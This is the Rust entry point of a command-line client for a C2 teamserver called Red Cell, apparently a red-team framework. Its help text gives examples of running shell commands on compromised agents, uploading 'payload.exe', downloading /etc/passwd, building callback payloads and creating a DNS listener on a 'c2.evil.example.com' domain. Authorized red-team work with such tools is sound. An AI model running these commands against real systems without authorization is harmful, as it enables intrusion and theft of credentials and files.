use clap::{Parser, Subcommand};
use tracing_subscriber::EnvFilter;

mod client;
mod commands;
mod config;
mod error;
mod output;

use error::{CliError, EXIT_SUCCESS};
use output::OutputFormat;

/// Red Cell C2 command-line client.
///
/// Communicates with a Red Cell teamserver over its JSON REST/WebSocket API.
/// All output is JSON by default — machine-parseable on stdout, structured
/// errors on stderr.
///
/// Authentication is resolved in this order (first wins):
///
///   1. --server / --token flags
///   2. RC_SERVER / RC_TOKEN environment variables
///   3. .red-cell-cli.toml in the current or any parent directory
///   4. ~/.config/red-cell-cli/config.toml
///
/// Exit codes:
///   0  success
///   1  general / argument error
///   2  not found
///   3  auth failure (bad token, insufficient role)
///   4  server unreachable
///   5  timeout exceeded
#[derive(Debug, Parser)]
#[command(name = "red-cell-cli", author, version, about, long_about = None)]
#[command(propagate_version = true)]
pub struct Cli {
    /// Teamserver base URL (e.g. https://teamserver:40056)
    #[arg(long, short = 's', env = "RC_SERVER", global = true)]
    pub server: Option<String>,

    /// API authentication token
    #[arg(long, short = 't', env = "RC_TOKEN", global = true)]
    pub token: Option<String>,

    /// Output format
    #[arg(long, short = 'o', global = true, default_value = "json")]
    pub output: OutputFormat,

    /// Request timeout in seconds
    #[arg(long, global = true, default_value = "30")]
    pub timeout: u64,

    #[command(subcommand)]
    pub command: Option<Commands>,
}

/// Available top-level subcommands.
#[derive(Debug, Subcommand)]
pub enum Commands {
    /// Check teamserver connectivity and verify credentials.
    ///
    /// Examples:
    ///   red-cell-cli status
    ///   red-cell-cli --server https://ts:40056 --token mytoken status
    #[command(verbatim_doc_comment)]
    Status,

    /// Manage connected agents.
    ///
    /// Examples:
    ///   red-cell-cli agent list
    ///   red-cell-cli agent show <id>
    #[command(verbatim_doc_comment)]
    Agent {
        #[command(subcommand)]
        action: AgentCommands,
    },

    /// Manage listeners (HTTP/S, DNS, SMB, external).
    ///
    /// Examples:
    ///   red-cell-cli listener list
    ///   red-cell-cli listener show mylistener
    #[command(verbatim_doc_comment)]
    Listener {
        #[command(subcommand)]
        action: ListenerCommands,
    },

    /// Build and manage payloads.
    ///
    /// Examples:
    ///   red-cell-cli payload list
    ///   red-cell-cli payload build --listener http1 --os windows --arch x86_64
    #[command(verbatim_doc_comment)]
    Payload {
        #[command(subcommand)]
        action: PayloadCommands,
    },

    /// Manage operators and role-based access control.
    ///
    /// Examples:
    ///   red-cell-cli operator list
    ///   red-cell-cli operator create alice --role operator
    #[command(verbatim_doc_comment)]
    Operator {
        #[command(subcommand)]
        action: OperatorCommands,
    },

    /// View and stream the audit log.
    ///
    /// Examples:
    ///   red-cell-cli audit list
    ///   red-cell-cli audit tail
    #[command(verbatim_doc_comment)]
    Audit {
        #[command(subcommand)]
        action: AuditCommands,
    },

    /// Start a persistent JSON-pipe session with an agent.
    ///
    /// Examples:
    ///   red-cell-cli session --agent abc123
    #[command(verbatim_doc_comment)]
    Session {
        /// Agent ID to open a session with
        #[arg(long)]
        agent: String,
    },
}

/// Agent subcommands.
#[derive(Debug, Subcommand)]
pub enum AgentCommands {
    /// List all registered agents.
    ///
    /// Examples:
    ///   red-cell-cli agent list
    #[command(verbatim_doc_comment)]
    List,

    /// Show full details of a single agent.
    ///
    /// Examples:
    ///   red-cell-cli agent show abc123
    #[command(verbatim_doc_comment)]
    Show {
        /// Agent ID
        id: String,
    },

    /// Execute a shell command on an agent.
    ///
    /// Without --wait: returns immediately with a job ID.
    /// With --wait:    blocks until the agent returns output (exit code 5 on timeout).
    ///
    /// Examples:
    ///   red-cell-cli agent exec abc123 --cmd "whoami"
    ///   red-cell-cli agent exec abc123 --cmd "ipconfig /all" --wait --timeout 30
    #[command(verbatim_doc_comment)]
    Exec {
        /// Agent ID
        id: String,
        /// Shell command to execute on the agent
        #[arg(long)]
        cmd: String,
        /// Block until the agent returns output
        #[arg(long)]
        wait: bool,
        /// Seconds to wait before returning exit code 5 (default: 60)
        #[arg(long)]
        timeout: Option<u64>,
    },
    /// Retrieve pending task output from an agent
    ///
    /// Examples:
    ///   red-cell-cli agent output abc123
    ///   red-cell-cli agent output abc123 --watch
    ///   red-cell-cli agent output abc123 --since job_xyz --watch
    #[command(verbatim_doc_comment)]
    Output {
        /// Agent ID
        id: String,
        /// Stream new output as it arrives (prints JSON lines until Ctrl-C)
        #[arg(long)]
        watch: bool,
        /// Only fetch output newer than this job ID
        #[arg(long)]
        since: Option<String>,
    },
    /// Terminate an agent.
    ///
    /// Examples:
    ///   red-cell-cli agent kill abc123
    ///   red-cell-cli agent kill abc123 --wait
    #[command(verbatim_doc_comment)]
    Kill {
        /// Agent ID
        id: String,
        /// Block until the agent's status becomes "dead"
        #[arg(long)]
        wait: bool,
    },

    /// Upload a local file to an agent.
    ///
    /// Examples:
    ///   red-cell-cli agent upload abc123 --src ./payload.exe --dst "C:\\Temp\\p.exe"
    #[command(verbatim_doc_comment)]
    Upload {
        /// Agent ID
        id: String,
        /// Local path of the file to upload
        #[arg(long)]
        src: String,
        /// Destination path on the remote agent
        #[arg(long)]
        dst: String,
    },

    /// Download a file from an agent to local disk.
    ///
    /// Examples:
    ///   red-cell-cli agent download abc123 --src /etc/passwd --dst ./passwd.txt
    #[command(verbatim_doc_comment)]
    Download {
        /// Agent ID
        id: String,
        /// Source path on the remote agent
        #[arg(long)]
        src: String,
        /// Local path to write the downloaded file
        #[arg(long)]
        dst: String,
    },
}

/// Listener subcommands.
#[derive(Debug, Subcommand)]
pub enum ListenerCommands {
    /// List all configured listeners.
    ///
    /// Examples:
    ///   red-cell-cli listener list
    #[command(verbatim_doc_comment)]
    List,

    /// Show full details of a single listener.
    ///
    /// Examples:
    ///   red-cell-cli listener show http1
    #[command(verbatim_doc_comment)]
    Show {
        /// Listener name
        name: String,
    },

    /// Create a new listener.
    ///
    /// For simple cases supply individual flags; for complex HTTP listeners
    /// with headers, URIs, or proxy config pass --config-json instead.
    ///
    /// Examples:
    ///   red-cell-cli listener create --name http1 --type http --port 443
    ///   red-cell-cli listener create --name dns1  --type dns  --domain c2.evil.example.com
    ///   red-cell-cli listener create --name smb1  --type smb  --pipe-name my-pipe
    ///   red-cell-cli listener create --name ext1  --type external --endpoint /bridge
    ///   red-cell-cli listener create --name http1 --type http --config-json '{"name":"http1","host_bind":"0.0.0.0","port_bind":443,"host_rotation":"round-robin"}'
    #[command(verbatim_doc_comment)]
    Create {
        /// Listener display name
        #[arg(long)]
        name: String,

        /// Protocol: http, dns, smb, or external
        #[arg(long = "type")]
        listener_type: String,

        /// Bind port (HTTP default: 443, DNS default: 53)
        #[arg(long)]
        port: Option<u16>,

        /// Local interface to bind (default: 0.0.0.0)
        #[arg(long, default_value = "0.0.0.0")]
        host: String,

        /// C2 domain suffix handled by a DNS listener (required for --type dns)
        #[arg(long)]
        domain: Option<String>,

        /// Named pipe for SMB pivot traffic (required for --type smb)
        #[arg(long)]
        pipe_name: Option<String>,

        /// HTTP path registered on the teamserver (required for --type external)
        #[arg(long)]
        endpoint: Option<String>,

        /// Enable TLS for HTTP listeners (HTTPS)
        #[arg(long, default_value_t = false)]
        secure: bool,

        /// Full listener config as a raw JSON object (overrides all flags
        /// above; the JSON must match the server's inner config shape for
        /// the chosen --type)
        #[arg(long)]
        config_json: Option<String>,
    },

    /// Start a stopped listener (idempotent: already-running returns ok).
    ///
    /// Examples:
    ///   red-cell-cli listener start http1
    #[command(verbatim_doc_comment)]
    Start {
        /// Listener name
        name: String,
    },

    /// Stop a running listener (idempotent: already-stopped returns ok).
    ///
    /// Examples:
    ///   red-cell-cli listener stop http1
    #[command(verbatim_doc_comment)]
    Stop {
        /// Listener name
        name: String,
    },

    /// Delete a listener.
    ///
    /// Examples:
    ///   red-cell-cli listener delete http1
    #[command(verbatim_doc_comment)]
    Delete {
        /// Listener name
        name: String,
    },
}

/// Payload subcommands.
#[derive(Debug, Subcommand)]
pub enum PayloadCommands {
    /// Build a new payload
    Build {
        /// Listener ID the payload connects back to
        #[arg(long)]
        listener: String,
        /// Target OS (windows, linux, macos)
        #[arg(long)]
        os: String,
        /// Target architecture (x86_64, x86, aarch64)
        #[arg(long)]
        arch: String,
    },
    /// List previously built payloads
    List,
    /// Download a built payload to disk
    Download {
        /// Payload ID
        id: String,
        /// Local output path
        #[arg(long)]
        out: String,
    },
}

/// Operator subcommands.
#[derive(Debug, Subcommand)]
pub enum OperatorCommands {
    /// List all operators
    List,
    /// Create a new operator account
    Create {
        /// Operator username
        username: String,
        /// Role (admin, operator, viewer)
        #[arg(long, default_value = "operator")]
        role: String,
    },
    /// Delete an operator account
    Delete {
        /// Operator username
        username: String,
    },
    /// Change an operator's role
    SetRole {
        /// Operator username
        username: String,
        /// New role (admin, operator, viewer)
        role: String,
    },
}

/// Audit log subcommands.
#[derive(Debug, Subcommand)]
pub enum AuditCommands {
    /// List audit log entries (newest first)
    List {
        /// Filter by operator username
        #[arg(long)]
        operator: Option<String>,
        /// Filter by action type
        #[arg(long)]
        action: Option<String>,
        /// Maximum entries to return
        #[arg(long, default_value = "100")]
        limit: u32,
    },
    /// Stream new audit log entries as they arrive
    Tail,
}

// ── entry point ──────────────────────────────────────────────────────────────

fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .with_writer(std::io::stderr)
        .init();

    let cli = Cli::parse();

    // Bare invocation: print help and exit 0.
    if cli.command.is_none() {
        use clap::CommandFactory;
        let mut cmd = Cli::command();
        cmd.print_help().unwrap_or(());
        println!();
        std::process::exit(EXIT_SUCCESS);
    }

    let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
        Ok(rt) => rt,
        Err(e) => {
            eprintln!("fatal: failed to build async runtime: {e}");
            std::process::exit(error::EXIT_GENERAL);
        }
    };

    let exit_code = rt.block_on(dispatch(cli));
    std::process::exit(exit_code);
}

// ── async dispatcher ─────────────────────────────────────────────────────────

async fn dispatch(cli: Cli) -> i32 {
    // Capture output format before partial moves.
    let fmt = cli.output.clone();

    // Resolve configuration (CLI flags + env vars were already absorbed by
    // clap; this step adds the file-based fallbacks).
    let resolved = match config::resolve(cli.server, cli.token, cli.timeout) {
        Ok(cfg) => cfg,
        Err(e) => {
            let err: CliError = e.into();
            output::print_error(&err);
            return err.exit_code();
        }
    };

    // Build the shared API client.
    let api_client = match client::ApiClient::new(&resolved) {
        Ok(c) => c,
        Err(e) => {
            output::print_error(&e);
            return e.exit_code();
        }
    };

    let Some(command) = cli.command else {
        // Unreachable: bare invocation is handled in main().
        return EXIT_SUCCESS;
    };

    match command {
        Commands::Status => match commands::status::run(&api_client).await {
            Ok(data) => {
                output::print_success(&fmt, &data);
                EXIT_SUCCESS
            }
            Err(e) => {
                output::print_error(&e);
                e.exit_code()
            }
        },

        Commands::Agent { action } => commands::agent::run(&api_client, &fmt, action).await,

        Commands::Listener { action } => commands::listener::run(&api_client, &fmt, action).await,

        // Remaining commands are implemented in downstream issues.
        Commands::Payload { .. }
        | Commands::Operator { .. }
        | Commands::Audit { .. }
        | Commands::Session { .. } => {
            let err = CliError::General("this subcommand is not yet implemented".to_owned());
            output::print_error(&err);
            err.exit_code()
        }
    }
}
